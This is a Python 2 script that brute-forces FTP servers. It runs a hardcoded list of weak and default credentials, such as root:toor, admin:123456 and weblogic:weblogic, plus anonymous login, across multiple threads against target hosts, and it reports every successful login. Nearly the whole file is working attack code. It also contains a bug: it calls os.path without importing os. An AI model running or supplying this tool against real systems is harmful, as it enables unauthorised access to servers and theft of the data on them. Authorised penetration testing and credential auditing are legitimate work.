# -*- coding: UTF-8 -*-
__author__ = 'orleven'

'''
    Ftp 匿名、弱口令爆破
'''

import socket
import ftplib
import optparse
import threading

targetList = [



]
userpwdList = [
    "admin:123456",
    "admin:1234567890",
    "admin:1qaz2wsx",
    "admin:2wsx3edc",
    "admin:admin",
    "admin:admin123456",
    "administrator:123456",
    "administrator:1234567890",
    "administrator:admin",
    "administrator:admin123456",
    "oracle:oracle",
    "oracle:oracle123",
    "root:123456",
    "root:1qaz2wsx",
    "root:2wsx3edc",
    "root:admin",
    "root:root",
    "root:root123456",
    "root:toor",
    "weblogic:weblogic",
    "weblogic:weblogic123",
    "weblogic:weblogic123!",
    "weblogic_123:weblogic_123",
    "spark:spark",
    "spark:admin",
    "anonymous:test@orleven.com",
]
threadList = []
threadNum = 10
timeout=5

def _bruteLogin(hostname,port=21):
    flag = False
    print "[.] Trying: " + hostname +"\r\n",
    for line in userpwdList:
        username = line.split(':')[0]
        password = line.split(':')[1].strip('\r').strip('\n')
        try:
            ftp = ftplib.FTP()
            ftp.connect(hostname,port)
            ftp.login(username, password)
            print '[+] ' + str(hostname) + ":"+ str(port) + ': FTP Login Succeeded: ' + username  + ":" + password  +"\r\n",
            flag = True
            ftp.quit()
        except Exception, e:
            pass
    if not flag :
        print '[-] Could not brute force FTP credentials for '+ hostname +":"+ str(port) +"\r\n",
    return (None, None)

def bruteLogin(threadId):
    for i in xrange(threadId,len(targetList),threadNum):
        if ":" in targetList[i]:
            tal = targetList[i].split(":")
            hostname = tal[0]
            port = tal[1]
            dic = _bruteLogin(hostname,port)
        else:
            dic = _bruteLogin(targetList[i])
        
        
def scan():
    print "[.] Run start: Total " + str(len(targetList)) + " hosts!"+ "\r\n",
    socket.setdefaulttimeout(timeout)
    for threadId in xrange(0,threadNum):
        t = threading.Thread(target=bruteLogin,args=(threadId,))
        t.start()
        threadList.append(t)
    for num in xrange(0,threadNum):
        threadList[num].join()
    print "\r\n[.] Run over!"+ "\r\n",

def main():
    parse = optparse.OptionParser("usage %prog -T/t <target host> -P <target password>")
    parse.add_option('-t', dest='tgtHost', type='string', help='specify target host')
    parse.add_option('-T', dest='tgtHostFile', type='string', help='specify target host file')
    parse.add_option('-P', dest='tgtPasswordFile', type='string', help='specify target password file')
    (options, args) = parse.parse_args()
    if options.tgtHost != None :
        host = options.tgtHost
        targetList.append(host);
    if options.tgtPasswordFile != None:
        filepath = options.tgtPasswordFile
        if os.path.isfile(filepath):
            with open(filepath, 'r') as f:
                for line in f.readlines():
                    myline = line.strip('\r').strip('\n')
                    userpwdList.append(myline)
        else:
            print "[-] The path is not exist!" +"\r\n",
    if options.tgtHostFile != None :
        with open(options.tgtHostFile, 'r') as f:
            for line in f.readlines():
                host = line.strip('\r').strip('\n')
                targetList.append(host);
    scan()


if __name__ == '__main__':
    main()
